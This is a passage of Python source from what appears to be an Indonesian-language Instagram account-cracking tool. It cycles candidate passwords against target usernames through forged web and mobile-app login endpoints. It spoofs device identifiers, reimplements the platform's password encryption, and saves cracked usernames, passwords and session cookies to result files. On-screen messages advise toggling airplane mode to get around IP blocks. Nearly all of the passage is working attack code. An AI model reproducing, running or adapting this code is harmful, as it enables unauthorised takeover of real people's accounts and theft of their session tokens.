                            'username': username,
                        }
                        r.headers.update({
                            'x-instagram-ajax': self.x_instagram_ajax,
                            'x-ig-app-id': self.x_ig_app_id,
                            'accept-encoding': 'gzip, deflate, br',
                            'x-asbd-id': '198387',
                            'sec-fetch-mode': 'cors',
                            'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                            'accept': '*/*',
                            'origin': 'https://www.instagram.com',
                            'x-csrftoken': self.x_csrftoken,
                            'sec-fetch-dest': 'empty',
                            'x-ig-www-claim': '0',
                            'content-type': 'application/x-www-form-urlencoded',
                            'referer': url_fxcal_auth,
                            'sec-fetch-site': 'same-origin',
                            'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        })
                        response2 = r.post('https://www.instagram.com/fxcal/auth/login/ajax/', data = data, allow_redirects = True)
                        #open('Response.txt','a').write(f'{username}|{pws}|{self.enc_password}|{self.useragent}|{response2.text}\n')
                        if '"authenticated":true,' in str(response2.text) and '"token":"' in str(response2.text):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.useragent}", style="bold royal_blue1", width=67))
                            if '#PWD_INSTAGRAM_BROWSER:10:' in str(self.enc_password):
                                tree.add(Panel(f"[bold green]{self.enc_password}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold green]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Sukses.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|-')
                            open('Results/Ok-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|-\n')
                            break
                        elif '/challenge/action/' in str(response2.text):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style="bold royal_blue1", width=67))
                            if '#PWD_INSTAGRAM_BROWSER:10:' in str(self.enc_password):
                                tree.add(Panel(f"[bold red]{self.enc_password}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Checkpoint.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}')
                            open('Results/Cp-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}\n')
                            break
                        elif 'Page Not Found' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] COOKIES DISABLED IN YOUR BROWSER![bold white]", end='\r')
                            time.sleep(0.5)
                            continue
                        elif 'generic_request_error' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'ip_block' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif len(response2.text) == 0 or 'Oops, an error occurred.' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] OOPS, AN ERROR OCCURRED![bold white]", end='\r')
                            time.sleep(1.5)
                        elif 'Please wait a few' in str(response2.text) or 'Harap tunggu beberapa' in str(response2.text):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT![bold white]", end='\r')
                            time.sleep(7.5)
                        elif '"status":"ok"' in str(response2.text):
                            continue
                        else:
                            continue
            Looping += 1
            Console().print(f"[bold royal_blue1]   ──>[bold white] Crack[bold green] {str(username)[:20]}[bold royal_blue1]/[bold white]{str(self.persen)[:4]}%[bold royal_blue1]/[bold white]{str(len(total))}[bold royal_blue1]/[bold white]{Looping} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except RequestException as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
            time.sleep(10.5)
            self.MAIN_AJAX_FXCAL_AUTH_FACEBOOK(total, username, password, url_fxcal_auth, encrypt_password)
        except (Exception) as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')

    def MAIN_API_2023(self, total, username, password, encrypt_password):
        global Checkpoint, Sukses, Looping, Bad
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    self.persen = Looping * 100 / len(total)
                    with requests.Session() as r:
                        try:
                            self.useragent = Generate_Useragent().Instagram_Useragent().split('Safari/537.36')[1].replace(' InstagramLite 3.0.0.7.78', 'Instagram 275.0.0.27.98').replace('in_ID; 117883409)', 'in_ID; 458229219)')
                            self._hash = hashlib.md5()
                            self._hash.update(username.encode('utf-8') + pws.encode('utf-8'))
                            self.hex_ = self._hash.hexdigest()
                            self._hash.update(self.hex_.encode('utf-8') + '12345'.encode('utf-8'))
                            self.x_ig_device_id, self.x_ig_family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
                            r.headers.update({
                                'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                                'x-ig-app-locale': 'in_ID',
                                'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                                'x-ig-device-locale': 'in_ID',
                                'x-ig-android-id': f'android-{self._hash.hexdigest()[:16]}',
                                'x-ig-mapped-locale': 'id_ID',
                                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                                'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                                'x-ig-device-id': self.x_ig_device_id,
                                'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                                'x-ig-timezone-offset': str(-time.timezone),
                                'x-ig-connection-type': 'MOBILE(LTE)',
                                'x-ig-capabilities': '3brTv10=',
                                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                                'x-ig-app-id': '567067343352427',
                                'priority': 'u=3',
                                'user-agent': self.useragent,
                                'accept-language': 'id-ID, en-US',
                                'x-bloks-is-layout-rtl': 'false',
                                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                'Host': 'i.instagram.com',
                                'x-fb-http-engine': 'Liger',
                                'x-ig-family-device-id': self.x_ig_family_device_id,
                                'x-fb-client-ip': 'True',
                                'x-fb-server-cluster': 'True',
                                'x-fb-connection-type': 'MOBILE.LTE',
                                'connection': 'keep-alive',
                            })
                            data = (f'signed_body=SIGNATURE.%7B%22bool_opt_policy%22%3A%220%22%2C%22mobileconfig%22%3A%22%22%2C%22api_version%22%3A%223%22%2C%22unit_type%22%3A%222%22%2C%22query_hash%22%3A%229cac9e8ac064e819d752529586fa6d0f6721b00b2884d4ead8e1f865126aa5a1%22%2C%22_uid%22%3A%22%22%2C%22device_id%22%3A%22{self.x_ig_device_id}%22%2C%22_uuid%22%3A%22{self.x_ig_device_id}%22%2C%22fetch_type%22%3A%22ASYNC_FULL%22%7D')
                            if encrypt_password == '1' or encrypt_password == '01':
                                response = r.post('https://i.instagram.com/api/v1/launcher/mobileconfig/', data = data)
                                try:
                                    self.ig_set_password_encryption_key_id = int(response.headers['ig-set-password-encryption-key-id'])
                                    self.ig_set_password_encryption_pub_key = response.headers['ig-set-password-encryption-pub-key']
                                except (Exception):
                                    Console().print("\r                                                                       ", end='\r')
                                    time.sleep(0.07)
                                    Console().print(f"[bold royal_blue1]   ──>[bold red] PUBLIC KEY NOT FOUND![bold white]", end='\r')
                                    time.sleep(5.6)
                                    continue
                                try:
                                    self.session_key = get_random_bytes(32)
                                    self.iv = get_random_bytes(12)
                                    self.timestamp = str(int(datetime.datetime.now().timestamp()))
                                    self.decoded_publickey = base64.b64decode(self.ig_set_password_encryption_pub_key.encode())
                                    self.recipient_key = RSA.import_key(self.decoded_publickey)
                                    self.cipher_rsa = PKCS1_v1_5.new(self.recipient_key)
                                    self.rsa_encrypted = self.cipher_rsa.encrypt(self.session_key)
                                    self.cipher_aes = AES.new(self.session_key, AES.MODE_GCM, self.iv)
                                    self.cipher_aes.update(self.timestamp.encode())
                                    self.aes_encrypted, self.tag = self.cipher_aes.encrypt_and_digest(pws.encode("utf8"))
                                    self.size_buffer = len(self.rsa_encrypted).to_bytes(2, byteorder='little')
                                    self.payload = base64.b64encode(b''.join([
                                        b"\x01",
                                        self.ig_set_password_encryption_key_id.to_bytes(1, byteorder='big'),
                                        self.iv,
                                        self.size_buffer,
                                        self.rsa_encrypted,
                                        self.tag,
                                        self.aes_encrypted
                                    ]))
                                    self.enc_password = f'#PWD_INSTAGRAM:4:{self.timestamp}:{self.payload.decode()}'
                                except (Exception, UnicodeDecodeError, UnicodeEncodeError):
                                    self.enc_password = f'#PWD_INSTAGRAM:0:{int(datetime.datetime.now().timestamp())}:{pws}'
                            else:
                                self.enc_password = f'#PWD_INSTAGRAM:0:{int(datetime.datetime.now().timestamp())}:{pws}'
                            r.headers.update({
                                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                            })
                            data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{self._hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22{urllib.parse.quote_plus(str(self.enc_password))}%22%2C%22family_device_id%22%3A%22{self.x_ig_family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22vhjfgy%3A52%22%2C%22device_id%22%3A%22android-{self._hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A190391144200130%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A1%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{self.x_ig_family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_launch_ig4a_combined_60_percent%22%2C%22INTERNAL_INFRA_THEME%22%3A%22default%22%2C%22password_text_input_id%22%3A%22vhjfgy%3A53%22%2C%22qe_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                                    bk_client_context=%7B%22bloks_version%22%3A%228ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb')
                            response2 = r.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = data, allow_redirects = True)
                            #open('Response.txt','a').write(f'{username}|{self.enc_password}|{self.useragent}|' + str(response2.text.replace('\\', '')) +'\n')
                        except (UnicodeDecodeError, UnicodeEncodeError):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] CODEC CANNOT ENCODE CHARACTER![bold white]", end='\r')
                            time.sleep(2.5)
                            continue
                        if 'Bearer IGT:2:' in str(response2.text.replace('\\', '')) and '"pk_id":' in str(response2.text.replace('\\', '')):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                                try:
                                    self.ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response2.text.replace('\\', ''))).group(1)
                                    try:
                                        self.decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(self.ig_set_authorization.split('Bearer IGT:2:')[1]))
                                        self.cookies = (f'{Convert().Cookies(self.decode_ig_set_authorization)}')
                                    except (Exception):
                                        self.cookies = ('-')
                                    #try:
                                        #self.phone_number = re.search('"phone_number":"(.*?)",', str(response2.text.replace('\\', ''))).group(1)
                                        #self.full_name = re.search('"full_name":"(.*?)",', str(response2.text.replace('\\', ''))).group(1)
                                    #except (Exception) as e:
                                        #self.phone_number, self.full_name = ('', '')
                                except (Exception):
                                    self.ig_set_authorization = ('-')
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{pws}", style="bold royal_blue1", width=33)]))
                            if '#PWD_INSTAGRAM:4:' in str(self.enc_password):
                                tree.add(Panel(f"[bold green]{self.enc_password}", style="bold royal_blue1", width=67))
                            else:
                                tree.add(Panel(f"[bold green]{self.useragent}", style="bold royal_blue1", width=67))
                            #tree.add(Columns([Panel(f"[bold green]{self.full_name}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.phone_number}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.ig_set_authorization}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold green]{:,.2f}".format(self.pengikut), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(self.mengikuti), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(self.postingan), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Sukses.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies}')
                            open('Results/Ok-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies};\n')
                            break
                        elif 'challenge_required' in str(response2.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response2.text.replace('\\', '')):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{pws}", style="bold royal_blue1", width=33)]))
                            if '#PWD_INSTAGRAM:4:' in str(self.enc_password):
                                tree.add(Panel(f"[bold red]{self.enc_password}", style="bold royal_blue1", width=67))
                            else:
                                tree.add(Panel(f"[bold red]{self.useragent}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Checkpoint.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}')
                            open('Results/Cp-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}\n')
                            break
                        elif 'ip_block' in str(response2.text.replace('\\', '')):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'Unmapped IG Error' in str(response2.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response2.text.replace('\\', '')):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'Terjadi kesalahan tak terduga.' in str(response2.text.replace('\\', '')):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] TERJADI KESALAHAN TAK TERDUGA![bold white]", end='\r')
                            time.sleep(1.5)
                        elif 'Please wait a few' in str(response2.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response2.text.replace('\\', '')):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold blue] HARAP TUNGGU BEBERAPA MENIT![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'Kata sandi yang Anda masukkan salah.' in str(response2.text.replace('\\', '')):
                            Bad += 1
                            continue
                        else:
                            continue
            Looping += 1
            Console().print(f"[bold royal_blue1]   ──>[bold white] Crack[bold green] {str(username)[:20]}[bold royal_blue1]/[bold white]{str(self.persen)[:4]}%[bold royal_blue1]/[bold white]{str(len(total))}[bold royal_blue1]/[bold white]{Looping}[bold royal_blue1]/[bold white]{Bad} Ok:-[bold green]{len(Sukses)}[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white]     ", end='\r')
        except RequestException as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] KONEKSI ERROR![bold white]", end='\r')
            time.sleep(10.5)
            self.MAIN_API_2023(total, username, password, encrypt_password)
        except (Exception) as e:
            Console().print("\r                                                                       ", end='\r')
            time.sleep(0.07)
            Console().print(f"[bold royal_blue1]   ──>[bold red] {str(e).upper()}[bold white]", end='\r')

    def MAIN_THREADS_2023(self, total, username, password, encrypt_password):
        global Checkpoint, Sukses, Looping, Bad
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    self.persen = Looping * 100 / len(total)
                    with requests.Session() as r:
                        self.useragent = Generate_Useragent().Instagram_Useragent().split('Safari/537.36')[1].replace(' InstagramLite 3.0.0.7.78', 'Barcelona 289.0.0.77.109').replace('in_ID; 117883409)', 'in_ID; 489720145)')
                        self.x_ig_device_id, self.x_ig_family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
                        self._hash = hashlib.md5()
                        self._hash.update(username.encode('utf-8') + pws.encode('utf-8'))
                        self.hex_ = self._hash.hexdigest()
                        self._hash.update(self.hex_.encode('utf-8') + '12345'.encode('utf-8'))
                        r.headers.update({
                            'x-fb-http-engine': 'Liger',
                            'Host': 'i.instagram.com',
                            'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                            'x-ig-capabilities': '3brTv10=',
                            'x-ig-device-id': self.x_ig_device_id,
                            'x-tigon-is-retry': 'True, True',
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'x-ig-connection-type': 'MOBILE(LTE)',
                            'connection': 'keep-alive',
                            'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                            'x-ig-www-claim': '0',
                            'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                            'x-ig-mapped-locale': 'id_ID',
                            'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                            'x-ig-app-locale': 'in_ID',
                            'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                            'user-agent': self.useragent,
                            'x-ig-family-device-id': self.x_ig_family_device_id,
                            'x-bloks-is-layout-rtl': 'False',
                            'x-fb-connection-type': 'MOBILE.LTE',
                            'x-fb-server-cluster': 'True',
                            'accept-language': 'id-ID, en-US',
                            'ig-intended-user-id': '0',
                            'x-ig-app-id': '3419628305025917',
                            'x-ig-android-id': f'android-{self._hash.hexdigest()[:16]}',
                            'priority': 'u=3',
                            'x-ig-timezone-offset': str(-time.timezone),
                            'x-ig-device-locale': 'in_ID',
                            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                            'x-fb-client-ip': 'True',
                        })
                        try:
                            data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{self._hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(pws))}%22%2C%22family_device_id%22%3A%22{self.x_ig_family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{self._hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{self.x_ig_family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                                    bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
                            response = r.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = data, allow_redirects = True)
                            #open('Response.txt','a').write(f'{username}|{pws}|{self.useragent}|' + str(response.text.replace("\\", "")) + '\n')
                        except (UnicodeDecodeError, UnicodeEncodeError):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] CODEC CANNOT ENCODE CHARACTER![bold white]", end='\r')
                            time.sleep(2.5)
                            continue
                        if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                                try:
                                    self.ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
                                    try:
                                        self.decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(self.ig_set_authorization.split('Bearer IGT:2:')[1]))
                                        self.cookies = (f'{Convert().Cookies(self.decode_ig_set_authorization)}')
                                    except (Exception):
                                        self.cookies = ('-')
                                    #try:
                                        #self.phone_number = re.search('"phone_number":"(.*?)",', str(response.text.replace('\\', ''))).group(1)
                                        #self.full_name = re.search('"full_name":"(.*?)",', str(response.text.replace('\\', ''))).group(1)
                                    #except (Exception) as e:
                                        #self.phone_number, self.full_name = ('', '')
                                except (Exception):
                                    self.ig_set_authorization = ('-')
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style="bold royal_blue1", width=33), Panel(f"[bold green]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.useragent}", style="bold royal_blue1", width=67))
                            #tree.add(Columns([Panel(f"[bold green]{self.full_name}", style="bold royal_blue1", width=33), Panel(f"[bold green]{self.phone_number}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold green]{self.ig_set_authorization}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold green]{:,.2f}".format(self.pengikut), style="bold royal_blue1", width=22), Panel("[bold green]{:,.2f}".format(self.mengikuti), style="bold royal_blue1", width=21), Panel("[bold green]{:,.2f}".format(self.postingan), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Sukses.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies}')
                            open('Results/Ok-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}|{self.cookies};\n')
                            break
                        elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                            try:
                                time.sleep(10.0)
                                self.cookie_tumbal = json.loads(open('Data/Cookie.json','r').read())['Cookie']
                                self.pengikut, self.mengikuti, self.postingan = Dapatkan().Akun_Publik(self.cookie_tumbal, username)
                            except:
                                break
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold royal_blue1"), style="bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style="bold royal_blue1", width=33), Panel(f"[bold red]{pws}", style="bold royal_blue1", width=33)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style="bold royal_blue1", width=67))
                            tree.add(Columns([Panel("[bold red]{:,.2f}".format(float(self.pengikut)), style="bold royal_blue1", width=22), Panel("[bold red]{:,.2f}".format(float(self.mengikuti)), style="bold royal_blue1", width=21), Panel("[bold red]{:,.2f}".format(float(self.postingan)), style="bold royal_blue1", width=22)]))
                            print(tree)
                            time.sleep(1.5)
                            Checkpoint.append(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}')
                            open('Results/Cp-{}.txt'.format(Results().Tanggal()), 'a+').write(f'{username}|{pws}|{self.pengikut}|{self.mengikuti}|{self.postingan}\n')
                            break
                        elif 'ip_block' in str(response.text.replace('\\', '')):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold yellow] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] HIDUPKAN MODE PESAWAT 2 DETIK![bold white]", end='\r')
                            time.sleep(7.5)
                        elif 'Terjadi kesalahan tak terduga.' in str(response.text.replace('\\', '')):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
